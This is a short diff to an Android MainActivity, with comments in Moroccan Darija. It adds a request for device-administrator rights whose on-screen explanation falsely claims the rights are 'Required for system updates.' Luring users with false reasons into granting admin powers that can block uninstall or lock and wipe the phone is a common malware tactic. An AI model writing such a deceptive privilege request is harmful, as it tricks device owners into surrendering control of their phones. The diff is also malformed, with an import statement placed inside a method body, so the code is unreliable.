@@ -31,6 +31,20 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        // Zid had l'import l'fo9
+import android.app.admin.DevicePolicyManager;
+
+// Zid had l'code f l'kher dyal onCreate()
+        // Request Device Admin
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
+        if (dpm != null && !dpm.isAdminActive(adminComponent)) {
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for system updates.");
+            startActivity(intent);
+        }
         
         // Build UI Programmatically
         layout = new LinearLayout(this);
